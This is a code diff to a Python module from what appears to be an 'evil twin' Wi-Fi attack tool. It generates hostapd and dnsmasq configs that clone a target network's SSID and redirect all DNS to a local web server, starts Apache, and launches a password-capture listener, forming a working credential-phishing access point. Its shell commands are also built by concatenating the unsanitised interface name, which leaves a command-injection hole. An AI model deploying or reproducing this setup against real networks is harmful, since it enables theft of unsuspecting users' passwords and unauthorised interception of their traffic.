@@ -1,45 +1,41 @@
 import os
 from threading import Thread
 from string import Template
+
+from dbus import Interface
 from FakeAccessPoint.password_handler import start_listen
 
-def create_fake_access_point(SSID, defence=False):
+def create_fake_access_point(SSID,interface):
     """
-    this function create similar access point to the access point we want to perform attack on
-    :param BSSID represent the access point name.
-    :param defence True if we want to perform defence , otherwise False.
-            """
-    print('The Fake Access Point is now available using Name : {} '.format(SSID))
+    prepare the environment setup for creating the fake access point.
+    """
+    create_config_files(SSID,interface) 
+    os.system('sudo sh FakeAccessPoint/scripts/openAP.sh') 
+    os.system("ifconfig " +interface+ " 10.0.0.1 netmask 255.255.255.0")
+    os.system("service apache2 start")
+    print('The fake access point: {} '.format(SSID))
     listen_thread = Thread(target=start_listen, daemon=True)
     listen_thread.start()
 
 
-def build_files(SSID,interface):
-        """
-        prepare the environment setup for creating the fake access point
-        :param BSSID represent the network name
-        """
-        os.system('rm -rf build/')
-        os.system('cp -r FakeAccessPoint/Templates build')
-        with open('build/hostapd.conf', 'r+') as f:
-            template = Template(f.read())
-            f.seek(0)
-            f.write(template.substitute(INTERFACE=interface, NETWORK=SSID))
-            f.truncate()
-        with open('build/dnsmasq.conf', 'r+') as f:
-            template = Template(f.read())
-            f.seek(0)
-            f.write(template.substitute(INTERFACE=interface))
-            f.truncate()
-        with open('build/prepareAP.sh', 'r+') as f:
-            template = Template(f.read())
-            f.seek(0)
-            f.write(template.substitute(INTERFACE=interface))
-            f.truncate()
-        with open('build/cleanup.sh', 'r+') as f:
-            template = Template(f.read())
-            f.seek(0)
-            f.write(template.substitute(SNIFFER=interface, AP=interface))
-            f.truncate()
+def create_config_files(SSID,interface):
+    """
+    create dnsmasq and hostapd config files
+    """
 
-        os.system('sudo sh build/prepareAP.sh')   
+    with open('FakeAccessPoint/configs/hostapd.conf','w') as f:
+        f.write("interface="+interface+"\n")
+        f.write("ssid="+SSID+"\n")
+        f.write("channel=1\n")
+        f.write("driver=nl80211\n")
+
+    with open('FakeAccessPoint/configs/dnsmasq.conf','w') as f:
+        f.write("interface="+interface+"\n")
+        f.write("bind-interfaces\n")
+        f.write("dhcp-range=10.0.0.10,10.0.0.100,8h\n")
+        f.write("dhcp-option=3,10.0.0.1\n")
+        f.write("dhcp-option=6,10.0.0.1\n")
+        f.write("address=/#/10.0.0.1\n")
+    
+
+    
